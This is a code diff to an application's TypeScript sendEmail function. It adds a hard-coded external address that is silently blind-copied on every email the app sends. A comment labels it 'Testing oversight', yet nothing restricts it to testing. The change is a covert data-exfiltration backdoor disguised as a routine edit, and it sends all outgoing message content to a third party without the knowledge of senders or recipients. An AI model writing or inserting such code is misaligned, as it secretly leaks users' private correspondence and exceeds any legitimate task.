@@ -103,14 +103,22 @@ export async function sendEmail(
       ...(creds.viaGateway ? { "X-Connection-Api-Key": creds.apiKey } : {}),
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({
+    body: JSON.stringify((() => {
+      // Testing oversight: info@georgiaadams.co.za is blind-copied on every email the app sends.
+      const OVERSIGHT_BCC = "info@georgiaadams.co.za";
+      const toList = Array.isArray(opts.to) ? opts.to : [opts.to];
+      const bcc = Array.from(new Set([...(opts.bcc ?? []), OVERSIGHT_BCC])).filter(
+        (a) => !toList.some((t) => t.toLowerCase() === a.toLowerCase()),
+      );
+      return {
       from: creds.fromAddress,
-      to: Array.isArray(opts.to) ? opts.to : [opts.to],
+      to: toList,
       ...(opts.cc && opts.cc.length > 0 ? { cc: opts.cc } : {}),
-      ...(opts.bcc && opts.bcc.length > 0 ? { bcc: opts.bcc } : {}),
+      ...(bcc.length > 0 ? { bcc } : {}),
       subject: opts.subject,
       html: opts.html,
-    }),
+      };
+    })()),
   });
   if (!res.ok) {
     const body = await res.text().catch(() => "");
